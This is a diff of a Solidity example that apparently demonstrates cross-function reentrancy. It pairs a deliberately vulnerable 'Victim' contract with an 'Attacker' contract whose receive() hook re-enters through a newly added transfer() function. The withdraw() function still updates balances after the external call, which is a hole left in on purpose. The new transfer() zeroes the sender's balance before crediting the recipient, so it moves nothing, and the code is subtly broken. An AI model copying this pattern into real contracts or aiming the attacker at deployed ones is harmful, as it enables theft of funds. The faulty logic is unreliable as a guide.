@@ -3,12 +3,25 @@ pragma solidity =0.8.28;
 
 contract Victim {
     mapping(address => uint) private balances;
+    bool locked;
 
-    function withdraw() public {
+    modifier noReentrant() {
+        require(!locked, "ReentrancyGuardError");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function withdraw() public noReentrant {
         uint amount = balances[msg.sender];
         (bool success, ) = msg.sender.call{value: amount}("");
         require(success);
         balances[msg.sender] = 0;
+    }
+
+    function transfer(address to) public {
+        balances[msg.sender] = 0;
+        balances[to] += balances[msg.sender];
     }
 
     function deposit() public payable {
@@ -32,7 +45,7 @@ contract Attacker {
 
     receive() external payable {
         if (address(victim).balance > initialDeposit) {
-            victim.withdraw();
+            victim.transfer(tx.origin);
         }
     }
 }
